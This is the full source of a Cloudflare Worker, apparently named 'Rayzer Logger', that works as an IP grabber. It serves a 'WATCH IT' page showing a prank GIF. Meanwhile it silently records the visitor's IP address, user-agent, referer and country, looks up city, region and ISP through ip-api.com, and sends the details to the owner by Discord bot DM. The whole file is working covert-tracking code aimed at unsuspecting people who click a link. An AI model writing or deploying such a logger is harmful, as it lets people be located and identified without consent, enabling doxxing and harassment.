// /cloudflare worker/DISCORD_BOT/worker-env.js

export default {
    async fetch(request, env, ctx) {
        const BOT_TOKEN = env.BOT_TOKEN;
        const OWNER_ID = env.OWNER_ID;
        const GIF_URL = env.GIF_URL || "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif";

        if (!BOT_TOKEN || !OWNER_ID) {
            return new Response("ERROR: BOT_TOKEN or OWNER_ID not set!", { status: 500 });
        }

        const ip = request.headers.get("cf-connecting-ip") || "Unknown";
        const userAgent = request.headers.get("user-agent") || "None";
        const referer = request.headers.get("referer") || "None";
        const country = request.headers.get("cf-ipcountry") || "None";

        let geoData = { city: "?", regionName: "?", country: country, isp: "?" };

        try {
            const gRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,query`);
            const geo = await gRes.json();
            if (geo.status === "success") {
                geoData = geo;
            }
        } catch (e) { }

        const payload = {
            embeds: [{
                title: "New Log (Discord Bot DM) 🔍",
                color: 0x5865f2,
                fields: [
                    { name: "IP", value: `\`${ip}\``, inline: true },
                    { name: "Location", value: `${geoData.city}, ${geoData.regionName}, ${geoData.country}`, inline: true },
                    { name: "ISP", value: geoData.isp || "Unknown", inline: false },
                    { name: "User-Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false },
                    { name: "Referer", value: referer, inline: false }
                ],
                footer: { text: "Rayzer Logger" },
                timestamp: new Date().toISOString()
            }]
        };

        const apiBase = "https://discord.com/api/v10";
        const headers = {
            "Content-Type": "application/json",
            "Authorization": `Bot ${BOT_TOKEN}`
        };

        ctx.waitUntil((async () => {
            try {
                // 1. Create DM Channel with Owner
                const dmRes = await fetch(`${apiBase}/users/@me/channels`, {
                    method: "POST",
                    headers: headers,
                    body: JSON.stringify({ recipient_id: OWNER_ID })
                });
                const dmChannel = await dmRes.json();

                if (dmChannel.id) {
                    // 2. Send Message to DM Channel
                    await fetch(`${apiBase}/channels/${dmChannel.id}/messages`, {
                        method: "POST",
                        headers: headers,
                        body: JSON.stringify(payload)
                    });
                }
            } catch (e) { }
        })());

        return new Response(`
      <!DOCTYPE html>
      <html>
        <head><title>WATCH IT</title><meta name="viewport" content="width=device-width, initial-scale=1.0"/></head>
        <body style="margin:0;background:black;display:flex;justify-content:center;align-items:center;height:100vh;">
          <img src="${GIF_URL}" style="max-width:100%;height:auto;" />
        </body>
      </html>
    `, {
            headers: { "Content-Type": "text/html" }
        });
    }
};
